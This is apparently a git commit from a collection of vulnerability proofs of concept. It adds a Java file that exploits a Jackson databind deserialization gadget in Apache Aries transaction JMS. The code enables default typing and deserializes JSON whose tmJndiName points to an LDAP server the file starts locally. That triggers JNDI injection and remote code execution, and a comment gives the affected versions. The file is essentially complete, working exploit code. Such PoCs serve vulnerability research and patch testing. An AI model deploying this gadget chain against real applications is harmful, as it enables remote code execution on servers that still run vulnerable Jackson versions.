e978d19007d9e26fa1d6f5ca030d72723b1bbcf0
“threedr3am” <929811313@qq.com>
2020-03-16 13:54:04 +0800

    feat:添加ignite-jta jackson gadget新利用点

---
+++ jackson/src/main/java/com/threedr3am/bug/jackson/rce/AriesJMSPoc2.java
@@ -0,0 +1,47 @@
+package com.threedr3am.bug.jackson.rce;
+
+import com.fasterxml.jackson.databind.ObjectMapper;
+import com.threedr3am.bug.common.server.LdapServer;
+import java.io.IOException;
+
+/**
+ * 比较鸡肋，需要调用writeValueAsString才能触发
+ *
+ * Reporter: Srikanth Ramu
+ *
+ * Fix will be included in:
+ *
+ * 2.9.10.4
+ * Does not affect 2.10.0 and later
+ *
+ * aries.transaction.jms gadget
+ *
+ * <dependency>
+ *     <groupId>org.apache.aries.transaction</groupId>
+ *     <artifactId>org.apache.aries.transaction.jms</artifactId>
+ *     <version>2.0.0</version>
+ * </dependency>
+ *
+ * @author threedr3am
+ */
+public class AriesJMSPoc2 {
+
+  static {
+    //rmi server示例
+//    RmiServer.run();
+
+    //ldap server示例
+    LdapServer.run();
+  }
+
+  public static void main(String[] args) throws IOException {
+    ObjectMapper mapper = new ObjectMapper();
+    mapper.enableDefaultTyping();
+
+    String json = "[\"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\", {\"tmJndiName\": \"ldap://localhost:43658/Calc\", \"tmFromJndi\": true}]";
+    Object o = mapper.readValue(json, Object.class);
+    mapper.writeValueAsString(o);
+  }
+
+
+}
